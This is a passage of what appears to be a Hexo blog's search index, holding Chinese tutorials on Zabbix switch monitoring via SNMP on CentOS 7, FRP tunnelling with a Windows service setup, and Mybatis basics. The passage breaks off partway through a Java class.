<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Centos7+zabbix5.x_监控交换机</title>
      <link href="/posts/18099/"/>
      <url>/posts/18099/</url>
      
        <content type="html"><![CDATA[<h3 id="RHEL-x2F-CentOS-7安装"><a href="#RHEL-x2F-CentOS-7安装" class="headerlink" title="RHEL&#x2F;CentOS 7安装"></a>RHEL&#x2F;CentOS 7安装</h3><p>从Zabbix 5.0版本开始，Zabbix前端需要PHP 7.2版或更高版本。</p><p>1.关闭防火墙和selinux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">sed -i &#x27;s/SELINUX=enforcing/SELINUX=disabled/&#x27; /etc/selinux/config</span><br><span class="line">reboot #重启</span><br></pre></td></tr></table></figure><p>2.安装zabbix rpm源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh https://mirrors.aliyun.com/zabbix/zabbix/5.0/rhel/7/x86_64/zabbix-release-5.0-1.el7.noarch.rpm</span><br><span class="line">sed -i &#x27;s#http://repo.zabbix.com#https://mirrors.aliyun.com/zabbix#&#x27; /etc/yum.repos.d/zabbix.repo</span><br><span class="line">yum clean all</span><br></pre></td></tr></table></figure><p>3.安装zabbix server </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install zabbix-server-mysql zabbix-agent -y</span><br></pre></td></tr></table></figure><p>4.安装 Software Collections</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install centos-release-scl -y</span><br></pre></td></tr></table></figure><p>5.启用 zabbix 前端源，修改<code>vi /etc/yum.repos.d/zabbix.repo</code>，将[zabbix-frontend]下的 enabled 改为 1</p><p>enabled&#x3D;1，过<code>yum</code>搜索<code>Zabbix</code>将返回<code>zabbix-web</code>包和四个新包。 这四个包是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zabbix-nginx-conf-scl.noarch : Nginx的Zabbix前端配置 (scl 版本)</span><br><span class="line">zabbix-web-deps-scl.noarch : 用于从redhat软件集合安装zabbix-web包所需PHP依赖项的便利包</span><br><span class="line">zabbix-web-mysql-scl.noarch : 用于MySQL数据库的Zabbix web前端包 (scl 版本)</span><br><span class="line">zabbix-web-pgsql-scl.noarch : 用于PostgreSQL数据库的Zabbix web前端包(scl 版本)</span><br></pre></td></tr></table></figure><blockquote><p>在安装MySQL数据库所需的<code>zabbix-web-mysql-scl</code>或者 PostgreSQL数据库所需的<code>zabbix-web-pgsql-scl</code>. 取决于Web服务器的需要，也请安装<code>zabbix-apache-conf-scl</code> 或者 <code>zabbix-nginx-conf-scl</code></p></blockquote><p>6.安装 zabbix 前端和相关环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install zabbix-web-mysql-scl zabbix-apache-conf-scl -y</span><br></pre></td></tr></table></figure><p>7.安装mariadb数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb-server -y</span><br><span class="line">systemctl enable --now mariadb</span><br></pre></td></tr></table></figure><p>8.初始化数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation  # 设置密码</span><br><span class="line">mysql -u root -p （输入数据库root密码进入数据库）</span><br><span class="line">create database zabbix character set utf8 collate utf8_bin; #创建数据库</span><br><span class="line">create user zabbix@localhost identified by &#x27;password&#x27;; #创建用户</span><br><span class="line">grant all privileges on zabbix.* to zabbix@localhost; #授权</span><br><span class="line">flush privileges;</span><br><span class="line">quit;</span><br></pre></td></tr></table></figure><p>9.导入数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -p zabbix</span><br></pre></td></tr></table></figure><p>10.修改配置文件zabbix_server.conf 里的数据库密码<code>vi /etc/zabbix/zabbix_server.conf</code></p><p>找到 DBPassword&#x3D;password ，将数据库密码改为zabbix数据库的密码，保存退出。</p><p>11.修改php时区，<code>vi /etc/opt/rh/rh-php72/php-fpm.d/zabbix.conf</code> 里的时区， 改成 Asia&#x2F;Shanghai</p><p>php_value[date.timezone] &#x3D; Asia&#x2F;Shanghai</p><blockquote><p>注意去掉前面的分号</p></blockquote><p>12.启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart zabbix-server zabbix-agent httpd rh-php72-php-fpm</span><br><span class="line">systemctl enable zabbix-server zabbix-agent httpd rh-php72-php-fpm</span><br></pre></td></tr></table></figure><h3 id="snmp测试"><a href="#snmp测试" class="headerlink" title="snmp测试"></a>snmp测试</h3><p><img src="https://image.jh2ing.com/image-20220310161437826.png" alt="image-20220310161437826"></p><p>配置交换机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;system-view </span><br><span class="line">[H3C]snmp-agent  </span><br><span class="line">[H3C]snmp-agent sys-info version v2c</span><br><span class="line">[H3C]snmp-agent community read public </span><br><span class="line">[H3C]snmp-agent trap enable</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 2c -c public 192.168.73.100 system</span><br></pre></td></tr></table></figure><p><img src="https://image.jh2ing.com/image-20220310161548987.png" alt="image-20220310161548987"></p><blockquote><p>snmp安装 <code>yum -y install net-snmp net-snmp-utils</code></p></blockquote><p>zabbix监控</p><p>登录地址：<code>http://ip/zabbix/</code></p><blockquote><p>默认密码：Admin&#x2F;zabbix</p></blockquote><p>在配置选项选择主机创建主机</p><p><img src="https://image.jh2ing.com/image-20220320105806023.png" alt="image-20220320105806023"></p><p>在SNMP community一般使用宏来配置SNMP community值</p><p><img src="https://image.jh2ing.com/image-20220320110220092.png" alt="image-20220320110220092"></p><p>配置完成之后需要等待zabbix去检测，SNMP显示说明已经成功连接</p><p><img src="https://image.jh2ing.com/image-20220320110320622.png" alt="image-20220320110320622"></p><p>选择图形可自定义监控项</p><p><img src="https://image.jh2ing.com/image-20220320110451487.png" alt="image-20220320110451487"></p><p><img src="https://image.jh2ing.com/image-20220320121527949.png" alt="image-20220320121527949"></p><p>中文乱码解决</p><p>安装方式的不同，可能路径不太一样。</p><p>通过find命令找到自己的zabbix路径</p><p><img src="https://image.jh2ing.com/image-20220320124515110.png" alt="image-20220320124515110"></p><p>这里是<code>/usr/share/zabbix</code></p><p>查找defines.inc.php文件中的字体路径<code>vim /usr/share/zabbix/include/defines.inc.php</code></p><p><img src="https://image.jh2ing.com/image-20220320124820647.png" alt="image-20220320124820647"></p><p>从自己电脑的字体库中拷贝字体到此目录下</p><p><img src="https://image.jh2ing.com/image-20220320125031999.png" alt="image-20220320125031999"></p><p><img src="https://image.jh2ing.com/image-20220320124920425.png" alt="image-20220320124920425"></p><p>修改defines.inc.php文件并重新启动zabbix</p><p><img src="https://image.jh2ing.com/image-20220320125140415.png" alt="image-20220320125140415"></p><p><img src="https://image.jh2ing.com/image-20220320125222367.png" alt="image-20220320125222367"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Centos </tag>
            
            <tag> zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frp内网穿透实现</title>
      <link href="/posts/32803/"/>
      <url>/posts/32803/</url>
      
        <content type="html"><![CDATA[<h3 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h3><p>frp是一个高性能的反向代理应用，可以帮助您轻松地进行内网穿透，对外网提供服务， 支持tcp, udp, http, https等协议类型，并且web服务支持根据域名进行路由转发。</p><p><img src="https://image.jh2ing.com/image-20220126141140473.png" alt="image-20220126141140473"></p><p><img src="https://image.jh2ing.com/image-20220126142547456.png" alt="image-20220126142547456"></p><ol><li>frp服务端和客户端通过8000建立连接；frps启动处于监听状态。</li><li>frpc启动后和frps建立连接，并告诉frps映射关系。</li><li>frps开始监听frpc需要映射的8080端口，如果有数据就发给frpc的3389端口。（frps和frpc建立一个管道，8080和3389为两端管道口）</li></ol><p>frps简单配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port=0.0.0.0</span><br><span class="line">bind_port=8000</span><br><span class="line">bind_udp_port=8001</span><br><span class="line"></span><br><span class="line"># 信息展示面板</span><br><span class="line">dashboard_port=</span><br><span class="line">dashboard_user=</span><br><span class="line">dashboard_pwd=</span><br><span class="line"></span><br><span class="line"># 认证</span><br><span class="line">token=</span><br><span class="line"></span><br><span class="line"># 日志</span><br><span class="line">log_file=frps.log</span><br><span class="line">log_level=info</span><br><span class="line">log_max_days=7</span><br></pre></td></tr></table></figure><p>frpc简单配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = </span><br><span class="line">server_port = 8000</span><br><span class="line"></span><br><span class="line">token = </span><br><span class="line"></span><br><span class="line">[3389]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389</span><br><span class="line">remote_port = 8080</span><br></pre></td></tr></table></figure><p>详情配置信息请参考官方模板</p><blockquote><p><a href="https://www.wlphp.com/?post=170">https://www.wlphp.com/?post=170</a></p></blockquote><h3 id="2、运行优化"><a href="#2、运行优化" class="headerlink" title="2、运行优化"></a>2、运行优化</h3><p>服务器和客户端分别运行</p><p><code>frpc -c frpc.ini</code></p><p><code>frps -c frps.ini</code></p><blockquote><p>注意：防火墙策略需要放行所需端口</p></blockquote><p><strong>开机启动（只针对Windows）</strong></p><p>编辑vbs脚本</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">createobject</span>(<span class="string">&quot;wscript.shell&quot;</span>).run <span class="string">&quot;frpc.exe -c frpc.ini&quot;</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>win+r 运行 </p><p><code>shell:startup</code></p><p>把vbs脚本快捷方式加入可实现</p><blockquote><p>此方法只有登录用户之后才会运行</p></blockquote><p><strong>1、加入定时任务</strong></p><p><strong>2、新建服务实现开机后不需要登录即可运行程序</strong></p><p>所需instsrv+srvany软件来实现注册服务，通过实验发现sc无法完成</p><p>下载链接</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/16Mg1OF8kaZ38dPmI3hcncQ">https://pan.baidu.com/s/16Mg1OF8kaZ38dPmI3hcncQ</a><br>提取码：1lf2 </p></blockquote><p>把两个文件放入C:\Windows\System32中执行</p><p><code>instsrv ServiceName C:\Windows\System32\srvany.exe</code></p><p><code>ServiceName</code>自定义服务名</p><blockquote><p>注意：如果此命令无法执行，请将srvany.exe放入C:\Windows\SysWOW64中</p></blockquote><p>执行成功之后打开注册表</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</p><p>在Services下找到自己定义的服务名<code>ServiceName</code></p><p>如果该服务名下没有Parameters项目，则对服务名称项目右击新建项，名称为Parameters，然后定位到Parameters项，新建以下几个字符串值。</p><ul><li>名称 <code>Application</code> 值为你要作为服务运行的程序地址。</li><li>名称 <code>AppDirectory</code> 值为你要作为服务运行的程序所在文件夹路径。</li><li>名称 <code>AppParameters </code>值为你要作为服务运行的程序启动所需要的参数。</li></ul><p>如图所示</p><p><img src="https://image.jh2ing.com/image-20220126155723375.png" alt="image-20220126155723375"></p><p>启动此服务便可实现内网穿透。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frp </tag>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis笔记（上）</title>
      <link href="/posts/34857/"/>
      <url>/posts/34857/</url>
      
        <content type="html"><![CDATA[<h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><h3 id="1-1-什么是Mybatis"><a href="#1-1-什么是Mybatis" class="headerlink" title="1.1 什么是Mybatis"></a>1.1 什么是Mybatis</h3><ul><li>Mybatis是一款优秀的<strong>持久层框架</strong>。</li><li>支持定制化SQL、存储过程以及高级映射。</li><li>避免了几乎所有的JDBC代码和手动设置参数以及获取结果集。</li><li>Mybatis可以使用简单的XML或注解来配置和映射原生类型、接口和Java的POJO（Plain Old Java Object，普通老式Java对象）为数据库中的记录。</li><li>MyBatis是apache的一个开源项目iBats。</li></ul><p>如何获取Mybatis？</p><ul><li>maven仓库</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>Github：<a href="https://github.com/mybatis/mybatis-3/releases">https://github.com/mybatis/mybatis-3/releases</a></li><li>中文文档：<a href="https://mybatis.org/mybatis-3/zh/index.html">https://mybatis.org/mybatis-3/zh/index.html</a></li></ul><h3 id="1-2、持久化"><a href="#1-2、持久化" class="headerlink" title="1.2、持久化"></a>1.2、持久化</h3><p>数据持久化</p><ul><li>持久化就是将程序的数据在持久化状态和瞬间状态转化的过程。</li><li>内存：<strong>断电即失。</strong></li><li>数据库（JDBC），IO文件持久化。</li><li>生活：冷藏。</li></ul><p><strong>为什么需要持久化？</strong></p><ul><li>有一些对象不能让他丢掉。</li></ul><h3 id="1-3、持久层"><a href="#1-3、持久层" class="headerlink" title="1.3、持久层"></a>1.3、持久层</h3><p>学过Dao层、Service层、Controller层…</p><ul><li>完成持久化工作的代码块。</li><li>层界限明显。</li></ul><h3 id="1-4、为什么需要Mybatis？"><a href="#1-4、为什么需要Mybatis？" class="headerlink" title="1.4、为什么需要Mybatis？"></a>1.4、为什么需要Mybatis？</h3><ul><li>帮助程序员将数据存入到数据库中。</li><li>传统JDBC代码太复杂。简化、框架、自动化。</li><li>更容易上手。<strong>技术没有高低之分</strong></li><li><strong>使用的人比较多</strong></li></ul><h2 id="2、第一个Mybatis程序"><a href="#2、第一个Mybatis程序" class="headerlink" title="2、第一个Mybatis程序"></a>2、第一个Mybatis程序</h2><p><strong>思路：搭建环境–&gt;导入Mybatis–&gt;编写代码–&gt;测试</strong></p><h3 id="2-1、环境搭建"><a href="#2-1、环境搭建" class="headerlink" title="2.1、环境搭建"></a>2.1、环境搭建</h3><p>搭建数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(</span><br><span class="line">`id` INT PRIMARY KEY,</span><br><span class="line">`name` CHAR(18),</span><br><span class="line">`passwd` CHAR(18)</span><br><span class="line">)ENGINE=INNODB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">INSERT INTO users(id,NAME,passwd) VALUES(1,&#x27;aaa&#x27;,&#x27;123&#x27;),(2,&#x27;bbb&#x27;,&#x27;456&#x27;),(3,&#x27;ccc&#x27;,&#x27;789&#x27;);</span><br><span class="line"></span><br><span class="line">SELECT * FROM users;</span><br></pre></td></tr></table></figure><p>新建项目</p><p>1.新建一个Maven项目</p><p>2.删除src文件夹</p><p>3.导入maven依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--mysql驱动--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.46<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--Mybatis--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--Junit--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2、创建一个模块"><a href="#2-2、创建一个模块" class="headerlink" title="2.2、创建一个模块"></a>2.2、创建一个模块</h3><ul><li>编写mybatis的核心配置文件</li></ul><blockquote><p><font color="red">注意在xml下，url里的&amp;需要转义</font></p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/test?useSSL=true<span class="symbol">&amp;amp;</span>useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=utf-8&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>编写mybatis工具类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// qlSessionFactory--&gt;sqlSession</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisUtils</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory sqlSessionFactory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取sqlSessionFactory</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line">            sqlSessionFactory = <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取sqlSession</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title function_">getSqlSession</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactory.openSession();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3、编写代码"><a href="#2-3、编写代码" class="headerlink" title="2.3、编写代码"></a>2.3、编写代码</h3><ul><li>实体类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String passwd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(<span class="type">int</span> id, String name, String passwd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.passwd = passwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPasswd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> passwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPasswd</span><span class="params">(String passwd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.passwd = passwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, passwd=&#x27;&quot;</span> + passwd + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span 